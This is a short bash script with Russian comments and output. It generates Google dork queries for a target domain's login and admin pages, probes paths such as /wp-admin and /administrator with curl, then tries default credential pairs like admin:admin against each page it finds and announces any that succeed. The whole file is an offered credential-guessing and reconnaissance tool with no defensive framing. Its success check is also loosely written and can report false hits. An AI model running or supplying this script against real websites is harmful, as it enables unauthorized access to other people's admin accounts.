#!/bin/bash
TARGET=${1:-"example.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🔍 GOOGLE DORK LOGIN — Вход через Google  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Ищем страницы входа через Google Dorks
DORKS=(
    "site:$TARGET inurl:login"
    "site:$TARGET inurl:admin"
    "site:$TARGET inurl:wp-admin"
    "site:$TARGET intitle:\"login\""
    "site:$TARGET intitle:\"sign in\""
)

for dork in "${DORKS[@]}"; do
    encoded=$(echo "$dork" | sed 's/ /%20/g;s/:/%3A/g;s/"/%22/g')
    echo "  🔍 $dork"
    echo "  🔗 https://www.google.com/search?q=$encoded"
done

# Проверяем стандартные логины
echo ""
echo "[LOGIN] 🔑 Проверяю стандартные входы..."
for path in "/login" "/admin" "/wp-admin" "/administrator" "/user/login" "/signin"; do
    code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$TARGET$path" 2>/dev/null)
    [ "$code" = "200" ] && echo "  💀 НАЙДЕН ВХОД: $path" && echo "$path" >> /tmp/found_logins.txt
done

# Пробуем стандартные пароли
[ -f /tmp/found_logins.txt ] && while read path; do
    for cred in "admin:admin" "admin:password" "admin:12345" "admin:admin1234"; do
        user="${cred%%:*}"
        pass="${cred##*:}"
        code=$(curl -sk --max-time 5 -u "$user:$pass" "$TARGET$path" -o /dev/null -w "%{http_code}" 2>/dev/null)
        [ "$code" = "200" ] || [ "$code" = "302" ] && echo "  💀 ПАРОЛЬ ПОДОШЁЛ: $user:$pass → $path"
    done
done < /tmp/found_logins.txt

echo "[GOOGLE] ✅ Анализ завершён"
